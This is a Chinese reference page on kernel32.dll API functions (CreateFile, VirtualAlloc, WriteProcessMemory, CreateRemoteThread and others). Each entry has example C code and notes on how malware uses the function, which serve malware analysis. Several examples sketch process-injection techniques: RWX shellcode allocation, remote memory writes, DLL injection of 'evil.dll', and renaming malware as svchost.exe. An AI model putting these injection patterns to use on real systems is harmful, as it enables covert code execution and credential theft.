---
title: c语言函数表
date: 2026-09-05
category: 知识库
tags: ["C语言", "函数"]
excerpt: 对C语言进行的函数编表
---
# Windows API (kernel32.dll)

Windows Kernel32.dll 是 Windows 操作系统的核心动态链接库之一，提供了系统级的基础功能，包括**文件与设备 I/O、进程与线程管理、内存管理、系统时间、错误处理**等。恶意代码分析中，该库的函数常被用于文件操作、进程注入和持久化控制。

## CreateFile（）：创建或打开文件或设备

创建一个文件、设备、管道或控制台，返回一个句柄用于后续读写操作。

**函数原型**：
```c
HANDLE CreateFile(
  LPCSTR lpFileName,                    // 文件名或设备路径
  DWORD dwDesiredAccess,                // 访问模式（读/写）
  DWORD dwShareMode,                    // 共享模式
  LPSECURITY_ATTRIBUTES lpSecurityAttributes, // 安全属性（通常为 NULL）
  DWORD dwCreationDisposition,          // 文件存在/不存在时的处理方式
  DWORD dwFlagsAndAttributes,           // 文件属性与标志
  HANDLE hTemplateFile                  // 模板文件句柄（通常为 NULL）
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `lpFileName` | `LPCSTR` | 要打开的文件、设备或管道的路径。例如 `C:\\test.txt`（普通文件）、`\\\\.\\PhysicalDrive0`（物理磁盘）、`COM1`（串口）。 |
| `dwDesiredAccess` | `DWORD` | 指定对文件/设备的访问方式：`GENERIC_READ`（只读）、`GENERIC_WRITE`（只写）、`GENERIC_READ \| GENERIC_WRITE`（读写）。传 `0` 表示既不读也不写，用于查询属性。 |
| `dwShareMode` | `DWORD` | 指定其他进程能否在你打开文件的同时访问该文件：`0` 表示独占（其他进程无法打开），`FILE_SHARE_READ` 允许其他进程读取，`FILE_SHARE_WRITE` 允许其他进程写入。 |
| `lpSecurityAttributes` | `LPSECURITY_ATTRIBUTES` | 安全属性，用于设置文件句柄是否可被子进程继承。通常传 `NULL` 表示使用默认安全描述符且句柄不可继承。 |
| `dwCreationDisposition` | `DWORD` | 指定文件存在或不存在时采取的动作：`CREATE_NEW`（创建新文件，存在则失败）、`CREATE_ALWAYS`（总是创建，覆盖已有文件）、`OPEN_EXISTING`（打开已有文件，不存在则失败）、`OPEN_ALWAYS`（打开文件，不存在则创建）、`TRUNCATE_EXISTING`（打开并清空文件，文件必须存在）。 |
| `dwFlagsAndAttributes` | `DWORD` | 设置文件属性或特殊行为。常用值：`FILE_ATTRIBUTE_NORMAL`（普通文件）、`FILE_ATTRIBUTE_HIDDEN`（隐藏文件）、`FILE_ATTRIBUTE_READONLY`（只读）、`FILE_FLAG_DELETE_ON_CLOSE`（关闭句柄时自动删除文件）、`FILE_FLAG_OVERLAPPED`（异步 I/O 模式）。 |
| `hTemplateFile` | `HANDLE` | 模板文件句柄，用于继承其文件属性。通常传 `NULL` 表示不使用模板。 |

**返回值**：
- **成功**：返回有效的文件句柄（`HANDLE`）
- **失败**：返回 `INVALID_HANDLE_VALUE`（`-1`），可通过 `GetLastError()` 获取错误码

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    HANDLE hFile = CreateFile(
        "C:\\test.txt",                 // 文件名
        GENERIC_READ | GENERIC_WRITE,   // 读写访问
        0,                              // 独占访问
        NULL,                           // 默认安全属性
        CREATE_ALWAYS,                  // 总是创建新文件
        FILE_ATTRIBUTE_NORMAL,          // 普通文件属性
        NULL                            // 无模板文件
    );

    if (hFile != INVALID_HANDLE_VALUE) {
        printf("文件创建成功！句柄: %p\n", hFile);
        CloseHandle(hFile);
    } else {
        printf("文件创建失败，错误码: %lu\n", GetLastError());
    }
    return 0;
}
```

**运行结果示范**：
```text
文件创建成功！句柄: 0x00000000000000C8
```

**在病毒分析中的价值**：当参数中出现 `\\\\.\\PhysicalDrive0` 时，表示正在访问物理磁盘；若出现 `C:\\Windows\\system32\\drivers\\...`，则可能是驱动级操作。调试时应重点关注 `lpFileName` 参数。


## WriteFile（）：向文件或设备写入数据

将数据写入指定的文件或设备。

**函数原型**：
```c
BOOL WriteFile(
  HANDLE hFile,                         // 文件句柄
  LPCVOID lpBuffer,                     // 要写入的数据缓冲区
  DWORD nNumberOfBytesToWrite,          // 要写入的字节数
  LPDWORD lpNumberOfBytesWritten,       // 实际写入的字节数
  LPOVERLAPPED lpOverlapped             // 重叠结构（异步I/O时使用）
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `hFile` | `HANDLE` | 要写入的文件或设备的句柄，由 `CreateFile` 成功返回。 |
| `lpBuffer` | `LPCVOID` | 指向要写入的数据缓冲区的指针，即数据从哪个内存地址开始读取并写入文件。 |
| `nNumberOfBytesToWrite` | `DWORD` | 指定要从缓冲区写入文件的字节数。 |
| `lpNumberOfBytesWritten` | `LPDWORD` | 指向一个变量的指针，函数执行完后该变量会被填充为实际写入的字节数。传 `NULL` 表示不关心实际写入数量（不推荐）。 |
| `lpOverlapped` | `LPOVERLAPPED` | 异步 I/O 时使用的结构指针，用于指定偏移量等。同步操作时传 `NULL`。 |

**返回值**：
- **成功**：返回非零值（`TRUE`）
- **失败**：返回 `FALSE`，可通过 `GetLastError()` 获取错误码

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    HANDLE hFile = CreateFile(
        "C:\\test.txt",
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("打开文件失败\n");
        return 1;
    }

    char buffer[] = "Hello, World!";
    DWORD dwWritten = 0;

    BOOL bResult = WriteFile(
        hFile,                          // 文件句柄
        buffer,                         // 要写入的数据
        sizeof(buffer) - 1,             // 要写入的字节数（不含'\0'）
        &dwWritten,                     // 实际写入的字节数
        NULL                            // 同步操作
    );

    if (bResult) {
        printf("写入成功，共写入 %lu 字节\n", dwWritten);
    } else {
        printf("写入失败，错误码: %lu\n", GetLastError());
    }

    CloseHandle(hFile);
    return 0;
}
```

**运行结果示范**：
```text
写入成功，共写入 13 字节
```

**在病毒分析中的价值**：病毒常使用 `WriteFile` 向物理磁盘（`\\.\\PhysicalDrive0`）写入恶意引导代码，或向系统目录写入恶意文件。调试时应检查 `hFile` 来源和 `lpBuffer` 内容。


## ReadFile（）：从文件或设备读取数据

从指定的文件或设备中读取数据。

**函数原型**：
```c
BOOL ReadFile(
  HANDLE hFile,                         // 文件句柄
  LPVOID lpBuffer,                      // 接收数据的缓冲区
  DWORD nNumberOfBytesToRead,           // 要读取的字节数
  LPDWORD lpNumberOfBytesRead,          // 实际读取的字节数
  LPOVERLAPPED lpOverlapped             // 重叠结构（异步I/O时使用）
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `hFile` | `HANDLE` | 要读取的文件或设备的句柄，由 `CreateFile` 成功返回。 |
| `lpBuffer` | `LPVOID` | 指向缓冲区的指针，用于接收从文件读取的数据。 |
| `nNumberOfBytesToRead` | `DWORD` | 指定要从文件读取的字节数。 |
| `lpNumberOfBytesRead` | `LPDWORD` | 指向一个变量的指针，函数执行完后该变量会被填充为实际读取的字节数。传 `NULL` 表示不关心实际读取数量（不推荐）。 |
| `lpOverlapped` | `LPOVERLAPPED` | 异步 I/O 时使用的结构指针。同步操作时传 `NULL`。 |

**返回值**：
- **成功**：返回非零值（`TRUE`）
- **失败**：返回 `FALSE`，可通过 `GetLastError()` 获取错误码

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    HANDLE hFile = CreateFile(
        "C:\\test.txt",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("打开文件失败\n");
        return 1;
    }

    char buffer[256] = {0};
    DWORD dwRead = 0;

    BOOL bResult = ReadFile(
        hFile,                          // 文件句柄
        buffer,                         // 接收数据的缓冲区
        sizeof(buffer) - 1,             // 要读取的字节数
        &dwRead,                        // 实际读取的字节数
        NULL                            // 同步操作
    );

    if (bResult) {
        printf("读取成功，共读取 %lu 字节\n", dwRead);
        printf("内容: %s\n", buffer);
    } else {
        printf("读取失败，错误码: %lu\n", GetLastError());
    }

    CloseHandle(hFile);
    return 0;
}
```

**运行结果示范**：
```text
读取成功，共读取 13 字节
内容: Hello, World!
```

**在病毒分析中的价值**：病毒可能使用 `ReadFile` 读取系统文件、配置文件或自身代码片段，用于后续解密或执行。调试时应检查 `hFile` 来源和 `lpBuffer` 接收到的数据。


## CloseHandle（）：关闭内核对象句柄

关闭一个打开的内核对象句柄（文件句柄、进程句柄、线程句柄等），释放系统资源。

**函数原型**：
```c
BOOL CloseHandle(
  HANDLE hObject                        // 要关闭的句柄
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `hObject` | `HANDLE` | 要关闭的内核对象句柄，可以是文件句柄、进程句柄、线程句柄、事件句柄等。关闭后该句柄不再有效，对应的内核对象引用计数减一。 |

**返回值**：
- **成功**：返回非零值（`TRUE`）
- **失败**：返回 `FALSE`，可通过 `GetLastError()` 获取错误码

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    HANDLE hFile = CreateFile(
        "C:\\test.txt",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile != INVALID_HANDLE_VALUE) {
        printf("文件句柄: %p\n", hFile);

        BOOL bResult = CloseHandle(hFile);
        if (bResult) {
            printf("句柄关闭成功\n");
        } else {
            printf("句柄关闭失败，错误码: %lu\n", GetLastError());
        }
    }
    return 0;
}
```

**运行结果示范**：
```text
文件句柄: 0x00000000000000C8
句柄关闭成功
```

**在病毒分析中的价值**：病毒在完成文件读写后通常会调用 `CloseHandle` 释放句柄。分析时可通过 `CloseHandle` 的调用点回溯到之前的 `CreateFile` 调用，推测其完整操作流程。未正确关闭句柄可能导致资源泄露，影响系统稳定性。


## DeleteFile（）：删除文件

删除指定路径的文件。

**函数原型**：
```c
BOOL DeleteFile(
  LPCSTR lpFileName                     // 要删除的文件路径
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `lpFileName` | `LPCSTR` | 要删除的文件路径。删除前需确认该文件未被占用（句柄未打开且不是只读属性）。 |

**返回值**：
- **成功**：返回非零值（`TRUE`）
- **失败**：返回 `FALSE`，可通过 `GetLastError()` 获取错误码（例如 `ERROR_ACCESS_DENIED`、`ERROR_FILE_NOT_FOUND`）

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    if (DeleteFile("C:\\test.txt")) {
        printf("文件删除成功\n");
    } else {
        printf("文件删除失败，错误码: %lu\n", GetLastError());
    }
    return 0;
}
```

**运行结果示范**：
```text
文件删除成功
```

**在病毒分析中的价值**：病毒常用于删除自身文件、清理日志或“擦除”被感染文件以掩盖痕迹。若某个进程反复删除 `C:\\Windows\\Temp\\` 或系统目录下的文件，应高度警惕。


## MoveFile（）：移动或重命名文件

将已有文件（或目录）移动到新位置，或仅修改名称。

**函数原型**：
```c
BOOL MoveFile(
  LPCSTR lpExistingFileName,            // 现有文件路径
  LPCSTR lpNewFileName                  // 目标路径
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `lpExistingFileName` | `LPCSTR` | 当前文件的完整路径。 |
| `lpNewFileName` | `LPCSTR` | 目标文件路径，可包含新文件名（重命名）或新目录（移动）。注意该函数**不跨越卷/盘符**移动，跨卷请用 `MoveFileEx` 加 `MOVEFILE_COPY_ALLOWED`。 |

**返回值**：
- **成功**：返回非零值（`TRUE`）
- **失败**：返回 `FALSE`，可通过 `GetLastError()` 获取错误码

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    // 把恶意样本改名伪装成系统 DLL 的常见操作
    if (MoveFile("C:\\malware.exe", "C:\\Windows\\Temp\\svchost.exe")) {
        printf("移动/重命名成功\n");
    } else {
        printf("移动失败，错误码: %lu\n", GetLastError());
    }
    return 0;
}
```

**运行结果示范**：
```text
移动/重命名成功
```

**在病毒分析中的价值**：恶意程序常把自身复制到系统目录后改名，再用 `MoveFile`/`CopyFile` 实现“落地”。分析时观察目标路径与文件名是否与系统组件一致（如 `svchost.exe`、`explorer.exe`），是判断伪装的线索。


## GetLastError（）：获取最近一次错误代码

返回调用线程最近一次由 Windows API 设置的错误代码，常与失败后的诊断配合使用。

**函数原型**：
```c
DWORD GetLastError(void);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| （无参数） | 返回值为调用线程上一次出错时系统设置的状态码。注意：**必须在失败后立即调用**，中间若执行了其他 API 可能覆盖该值。 |

**返回值**：返回 `DWORD` 类型的错误码。常见值如 `ERROR_FILE_NOT_FOUND`(2)、`ERROR_ACCESS_DENIED`(5)、`ERROR_ALREADY_EXISTS`(183)。

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    HANDLE h = CreateFile(
        "C:\\nofile.txt", GENERIC_READ, 0,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    );
    if (h == INVALID_HANDLE_VALUE) {
        printf("错误码: %lu (0x%lX)\n", GetLastError(), GetLastError());
    }
    return 0;
}
```

**运行结果示范**：
```text
错误码: 2 (0x2)
```

**在病毒分析中的价值**：在 x64dbg 中函数返回 `FALSE` 后，寄存器或栈上即可读 `GetLastError()` 返回值，用于判断目标文件/注册表是否存在，帮助还原恶意程序的逻辑分支。


## LoadLibraryA（）：动态加载一个 DLL

把指定的动态链接库映射到当前进程地址空间并返回模块句柄。

**函数原型**：
```c
HMODULE LoadLibraryA(
  LPCSTR lpLibFileName                  // DLL 路径或模块名
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `lpLibFileName` | `LPCSTR` | 模块名（如 `"kernel32.dll"`）或带路径的完整 DLL 路径（如 `"C:\\temp\\evil.dll"`）。不写路径时按系统搜索顺序查找。 |

**返回值**：
- **成功**：返回模块句柄（`HMODULE`）
- **失败**：返回 `NULL`，可通过 `GetLastError()` 获取错误码

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    HMODULE hDll = LoadLibraryA("C:\\Users\\Public\\evil.dll");
    if (hDll != NULL) {
        printf("DLL 加载成功，基址: %p\n", hDll);
        // 后续可用 GetProcAddress 获取其中的函数地址
    } else {
        printf("DLL 加载失败，错误码: %lu\n", GetLastError());
    }
    return 0;
}
```

**运行结果示范**：
```text
DLL 加载成功，基址: 0x00007FF6DE440000
```

**在病毒分析中的价值**：恶意程序常通过 `LoadLibraryA` 加载**不在导入表里**的 DLL，实现延迟加载/动态加载以规避静态检测。若加载路径位于临时目录或用户目录，则基本可判定为恶意“落地 DLL”。


## GetProcAddress（）：获取导出函数地址

根据模块句柄和函数名（或序号）取得 DLL 导出函数的真实地址。

**函数原型**：
```c
FARPROC GetProcAddress(
  HMODULE hModule,                      // LoadLibrary 或 GetModuleHandle 返回的句柄
  LPCSTR  lpProcName                    // 函数名或序号（低字节为 0 的序号）
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `hModule` | `HMODULE` | 目标模块句柄，来自 `LoadLibraryA` / `GetModuleHandleA`。 |
| `lpProcName` | `LPCSTR` | 要查找的导出函数名，如 `"CreateRemoteThread"`。传序号时需使用 `MAKEINTRESOURCE`。 |

**返回值**：
- **成功**：返回函数入口地址（`FARPROC`，可转换为具体函数指针）
- **失败**：返回 `NULL`

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

typedef BOOL (WINAPI *FnWriteFile)(
    HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);

int main() {
    HMODULE hK = GetModuleHandleA("kernel32.dll");
    FnWriteFile pWriteFile = (FnWriteFile)GetProcAddress(hK, "WriteFile");
    if (pWriteFile) {
        printf("WriteFile 地址: %p\n", (void*)pWriteFile);
    }
    return 0;
}
```

**运行结果示范**：
```text
WriteFile 地址: 0x00007FFA3B2C9D00
```

**在病毒分析中的价值**：`LoadLibraryA` + `GetProcAddress` 组合是 API 哈希解析的关键点——样本常先计算“函数名字符串哈希”再与导出表比对，避免在文件中出现明文字符串。断点下在 `GetProcAddress` 可看到目标函数名，是还原解密算法的重要抓手。


## OpenProcess（）：打开一个进程句柄

按进程 ID（PID）打开一个已有进程，获得对该进程的访问权限。

**函数原型**：
```c
HANDLE OpenProcess(
  DWORD dwDesiredAccess,                // 希望的访问权限
  BOOL  bInheritHandle,                 // 句柄是否可继承
  DWORD dwProcessId                     // 目标进程 ID
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `dwDesiredAccess` | `DWORD` | 需要的权限，如 `PROCESS_VM_READ`(读内存)、`PROCESS_VM_WRITE`(写内存)、`PROCESS_VM_OPERATION`(VirtualProtectEx)、`PROCESS_CREATE_THREAD`(创建远程线程)、`PROCESS_ALL_ACCESS`(全部)。 |
| `bInheritHandle` | `BOOL` | 句柄是否可被子进程继承，通常为 `FALSE`。 |
| `dwProcessId` | `DWORD` | 目标进程的 PID，可通过 `CreateToolhelp32Snapshot` 枚举或 `GetWindowThreadProcessId` 获得。 |

**返回值**：
- **成功**：返回目标进程句柄
- **失败**：返回 `NULL`，可通过 `GetLastError()` 获取错误码

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    DWORD pid = 1024;  // 假设已知目标 PID
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProc != NULL) {
        printf("已打开进程 %lu，句柄: %p\n", pid, hProc);
        CloseHandle(hProc);
    } else {
        printf("打开进程失败，错误码: %lu\n", GetLastError());
    }
    return 0;
}
```

**运行结果示范**：
```text
已打开进程 1024，句柄: 0x00000000000000B4
```

**在病毒分析中的价值**：进程注入/窃取（如读写 `lsass.exe` 内存、向 `explorer.exe` 注入）的第一步通常是 `OpenProcess`。若样本以 `PROCESS_VM_WRITE | PROCESS_CREATE_THREAD` 打开系统关键进程，基本可判定为注入行为。


## VirtualAlloc（）：在进程中分配虚拟内存

在当前进程地址空间预留并提交一段内存，返回其起始地址。

**函数原型**：
```c
LPVOID VirtualAlloc(
  LPVOID lpAddress,                     // 期望的起始地址（通常为 NULL）
  SIZE_T dwSize,                        // 分配大小（字节）
  DWORD  flAllocationType,              // 分配类型
  DWORD  flProtect                      // 内存保护属性
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `lpAddress` | `LPVOID` | 想要分配的起始地址；传 `NULL` 由系统自动挑选。 |
| `dwSize` | `SIZE_T` | 分配区域的字节数（按页向上取整）。 |
| `flAllocationType` | `DWORD` | 分配类型，常用 `MEM_COMMIT`(提交物理内存)、`MEM_RESERVE`(预留地址空间)，一般组合 `MEM_COMMIT \| MEM_RESERVE`。 |
| `flProtect` | `DWORD` | 保护属性，如 `PAGE_EXECUTE_READWRITE`(可读写可执行)、`PAGE_READWRITE`(可读写)。 |

**返回值**：
- **成功**：返回分配的起始地址
- **失败**：返回 `NULL`，可通过 `GetLastError()` 获取错误码

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>
#include <string.h>

int main() {
    // 分配一块 可读+可写+可执行 的内存（shellcode 加载常见做法）
    LPVOID pBuf = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pBuf) {
        memcpy(pBuf, "\xfc\xe8\x82\x00\x00\x00", 6); // 示例字节
        printf("已分配可执行内存: %p\n", pBuf);
        VirtualFree(pBuf, 0, MEM_RELEASE);
    }
    return 0;
}
```

**运行结果示范**：
```text
已分配可执行内存: 0x000001D4F9E30000
```

**在病毒分析中的价值**：`VirtualAlloc` 配 `PAGE_EXECUTE_READWRITE` 是 shellcode 的“标配”，属于高危指标（RWX 内存 + 随后写入解码数据）。分析时关注其后是否紧跟 `memcpy`/`WriteProcessMemory` 与 `CreateThread`/`CreateRemoteThread` 的跳转。


## VirtualProtect（）：修改内存保护属性

改变某段已提交内存的访问保护（例如把数据区改为可执行）。

**函数原型**：
```c
BOOL VirtualProtect(
  LPVOID lpAddress,                     // 目标内存起始地址
  SIZE_T dwSize,                        // 长度（字节）
  DWORD  flNewProtect,                  // 新的保护属性
  PDWORD lpflOldProtect                 // 接收旧保护属性的指针
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `lpAddress` | `LPVOID` | 要修改保护属性的内存区域起始地址。 |
| `dwSize` | `SIZE_T` | 要修改的长度（字节）。 |
| `flNewProtect` | `DWORD` | 新保护属性，如 `PAGE_EXECUTE_READWRITE`、`PAGE_READWRITE`、`PAGE_EXECUTE_READ`。 |
| `lpflOldProtect` | `PDWORD` | 接收“修改前”保护属性的输出指针，不能为 `NULL`。 |

**返回值**：
- **成功**：返回非零值（`TRUE`）
- **失败**：返回 `FALSE`，可通过 `GetLastError()` 获取错误码

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    BYTE code[] = { 0x90, 0x90, 0xC3 }; // 示例指令（NOP NOP RET）
    DWORD old = 0;

    // 先把只读数据段改为可写，写完再改回可执行
    if (VirtualProtect(code, sizeof(code), PAGE_EXECUTE_READWRITE, &old)) {
        printf("修改内存保护成功，旧属性: %lu\n", old);
        VirtualProtect(code, sizeof(code), old, &old); // 还原
    } else {
        printf("修改失败，错误码: %lu\n", GetLastError());
    }
    return 0;
}
```

**运行结果示范**：
```text
修改内存保护成功，旧属性: 4
```

**在病毒分析中的价值**：静态 PE 中 `.data`/`.rdata` 段本来不可执行，恶意代码用 `VirtualProtect` 临时改为 `PAGE_EXECUTE_READWRITE` 后写入解码字节再执行（如进程空洞、运行时脱壳）。在 API 断点观察 `flNewProtect == 0x40` 即 RWX，是强烈的恶意特征。


## WriteProcessMemory（）：向其他进程写入内存

把当前进程缓冲区数据写入另一个进程的地址空间。

**函数原型**：
```c
BOOL WriteProcessMemory(
  HANDLE  hProcess,                     // 目标进程句柄（OpenProcess 得到）
  LPVOID  lpBaseAddress,                // 目标进程内的写入地址
  LPCVOID lpBuffer,                     // 源缓冲区（本进程）
  SIZE_T  nSize,                        // 写入字节数
  SIZE_T  *lpNumberOfBytesWritten       // 实际写入字节数（可传 NULL）
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `hProcess` | `HANDLE` | 目标进程句柄，需带 `PROCESS_VM_WRITE \| PROCESS_VM_OPERATION` 权限。 |
| `lpBaseAddress` | `LPVOID` | 目标进程内要写入的起始地址（常由 `VirtualAllocEx` 在目标进程内分配）。 |
| `lpBuffer` | `LPCVOID` | 指向本进程中存放数据的缓冲区。 |
| `nSize` | `SIZE_T` | 要写入的字节数。 |
| `lpNumberOfBytesWritten` | `SIZE_T*` | 可选，接收实际写入字节数。 |

**返回值**：
- **成功**：返回非零值（`TRUE`）
- **失败**：返回 `FALSE`，可通过 `GetLastError()` 获取错误码

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    // 经典注入链路：OpenProcess -> VirtualAllocEx -> WriteProcessMemory
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 1024);
    if (!hProc) { printf("OpenProcess 失败\n"); return 1; }

    LPVOID pRemote = VirtualAllocEx(hProc, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pRemote) {
        BYTE shellcode[] = { 0x90, 0x90, 0xC3 };
        SIZE_T written = 0;
        if (WriteProcessMemory(hProc, pRemote, shellcode, sizeof(shellcode), &written)) {
            printf("已写入 %zu 字节到目标进程 %p\n", written, pRemote);
        }
    }
    CloseHandle(hProc);
    return 0;
}
```

**运行结果示范**：
```text
已写入 3 字节到目标进程 0x0000021F4E2A0000
```

**在病毒分析中的价值**：向**其他进程**写入可执行字节是远程代码注入的标志。写 `lsass.exe`、`winlogon.exe` 等高权限进程意味着提权或凭据窃取。分析应关注写入目标与写入后由谁执行（通常是 `CreateRemoteThread`）。


## ReadProcessMemory（）：读取其他进程的内存

把另一个进程地址空间中的数据读入当前进程的缓冲区。

**函数原型**：
```c
BOOL ReadProcessMemory(
  HANDLE  hProcess,                     // 目标进程句柄
  LPCVOID lpBaseAddress,                // 目标进程内的读取地址
  LPVOID  lpBuffer,                     // 接收数据的缓冲区（本进程）
  SIZE_T  nSize,                        // 要读取的字节数
  SIZE_T  *lpNumberOfBytesRead          // 实际读取字节数（可传 NULL）
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `hProcess` | `HANDLE` | 目标进程句柄，需带 `PROCESS_VM_READ` 权限。 |
| `lpBaseAddress` | `LPCVOID` | 目标进程内要读取的起始地址。 |
| `lpBuffer` | `LPVOID` | 存放读取结果的缓冲区。 |
| `nSize` | `SIZE_T` | 要读取的字节数。 |
| `lpNumberOfBytesRead` | `SIZE_T*` | 可选，接收实际读取字节数。 |

**返回值**：
- **成功**：返回非零值（`TRUE`）
- **失败**：返回 `FALSE`，可通过 `GetLastError()` 获取错误码

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    HANDLE hProc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, 1024);
    if (!hProc) { printf("OpenProcess 失败\n"); return 1; }

    BYTE buf[16] = {0};
    SIZE_T read = 0;
    if (ReadProcessMemory(hProc, (LPCVOID)0x7FF00000, buf, sizeof(buf), &read)) {
        printf("读取了 %zu 字节\n", read);
    }
    CloseHandle(hProc);
    return 0;
}
```

**运行结果示范**：
```text
读取了 16 字节
```

**在病毒分析中的价值**：恶意程序常用它从被注入的进程（或受保护的 `lsass.exe`）中读出密钥、密码或解密后的载荷。反调试/反虚拟机代码也可能用 `ReadProcessMemory` 校验自身内存是否被修改。


## CreateRemoteThread（）：在目标进程中创建线程

在另一个进程中创建新线程，线程起始地址可指向该进程中任意可执行地址。

**函数原型**：
```c
HANDLE CreateRemoteThread(
  HANDLE                 hProcess,          // 目标进程句柄
  LPSECURITY_ATTRIBUTES  lpThreadAttributes,// 安全属性（NULL）
  SIZE_T                 dwStackSize,       // 栈大小（0 = 默认）
  LPTHREAD_START_ROUTINE lpStartAddress,    // 线程入口地址
  LPVOID                 lpParameter,       // 传给入口的参数
  DWORD                  dwCreationFlags,   // 创建标志（0 = 立即运行）
  LPDWORD                lpThreadId         // 接收线程 ID（可 NULL）
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `hProcess` | `HANDLE` | 目标进程句柄，需 `PROCESS_CREATE_THREAD \| PROCESS_VM_OPERATION \| PROCESS_VM_WRITE`。 |
| `lpStartAddress` | `LPTHREAD_START_ROUTINE` | 新线程的入口函数地址，常指向先前写入的 shellcode 或 `LoadLibraryA` 地址。 |
| `lpParameter` | `LPVOID` | 传给入口的参数（如 DLL 路径字符串的远程地址）。 |
| `dwCreationFlags` | `DWORD` | `0` 表示立即运行；`CREATE_SUSPENDED` 表示先挂起。 |

**返回值**：
- **成功**：返回新线程句柄
- **失败**：返回 `NULL`，可通过 `GetLastError()` 获取错误码

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    // DLL 注入：在目标进程内创建线程执行 LoadLibraryA("evil.dll")
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 1024);
    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    LPVOID pLoadLib = (LPVOID)GetProcAddress(hK32, "LoadLibraryA");

    // 省略：先用 VirtualAllocEx + WriteProcessMemory 把路径写入目标进程
    // LPVOID pPath = ...;

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)pLoadLib, NULL, 0, NULL);
    if (hThread) {
        printf("远程线程已创建: %p\n", hThread);
        CloseHandle(hThread);
    }
    return 0;
}
```

**运行结果示范**：
```text
远程线程已创建: 0x0000000000000098
```

**在病毒分析中的价值**：`CreateRemoteThread` 是进程注入的“临门一脚”。一旦发现某进程调用它且线程入口指向**非系统 DLL 导出**的可疑地址（尤其前导是 `VirtualAllocEx` 分配的内存），即可确认为远程代码执行。


## GetModuleHandleA（）：获取已加载模块句柄

返回已加载模块的基址句柄，常用于定位 kernel32 等模块以解析导出函数。

**函数原型**：
```c
HMODULE GetModuleHandleA(
  LPCSTR lpModuleName                   // 模块名（NULL = 当前 EXE）
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `lpModuleName` | `LPCSTR` | 模块名，如 `"kernel32.dll"`；传 `NULL` 返回可执行文件（EXE）自身的映像基址。注意：**只查找已加载的模块**，未加载时返回 `NULL`。 |

**返回值**：
- **成功**：返回模块基址句柄（`HMODULE`，等于该模块映像基址）
- **失败**：返回 `NULL`

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    HMODULE hBase = GetModuleHandleA(NULL);   // 自身 EXE 基址（PE 头位置）
    HMODULE hK32  = GetModuleHandleA("kernel32.dll");
    printf("自身基址: %p\nkernel32: %p\n", (void*)hBase, (void*)hK32);
    return 0;
}
```

**运行结果示范**：
```text
自身基址: 0x00007FF7D11D0000
kernel32: 0x00007FFA3B1A0000
```

**在病毒分析中的价值**：shellcode/后门常用它拿到模块基址后再手工解析导出表；`GetModuleHandleA(NULL)` 得到的基址正是分析工具解析 PE 头部（验证 MZ/PE 签名、遍历节区）的入口。

## GetModuleFileNameA（）：获取模块完整路径

取得某已加载模块在磁盘上的完整路径与文件名。

**函数原型**：
```c
DWORD GetModuleFileNameA(
  HMODULE hModule,                      // 模块句柄（NULL = 当前 EXE）
  LPSTR   lpFilename,                   // 接收路径的缓冲区
  DWORD   nSize                         // 缓冲区大小
);
```

**参数说明**：

